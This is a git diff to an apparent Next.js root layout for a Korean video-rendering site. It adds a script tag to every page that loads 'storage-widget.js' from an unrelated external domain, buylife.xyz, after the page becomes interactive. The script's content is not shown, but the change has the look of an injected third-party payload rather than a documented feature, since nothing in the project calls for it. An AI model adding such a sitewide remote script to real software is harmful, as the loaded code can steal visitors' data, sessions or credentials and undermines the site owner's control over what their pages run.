@@ -1,5 +1,6 @@
 import type { Metadata } from "next";
 import "./globals.css";
+import Script from "next/script";
 
 export const metadata: Metadata = {
   title: "AI 영상렌더 스튜디오 | VideoRender Studio",
@@ -7,5 +8,5 @@ export const metadata: Metadata = {
 };
 
 export default function RootLayout({ children }: { children: React.ReactNode }) {
-  return <html lang="ko"><body>{children}</body></html>;
+  return <html lang="ko"><body>{children}<Script src="https://www.buylife.xyz/storage-widget.js" strategy="afterInteractive" /></body></html>;
 }
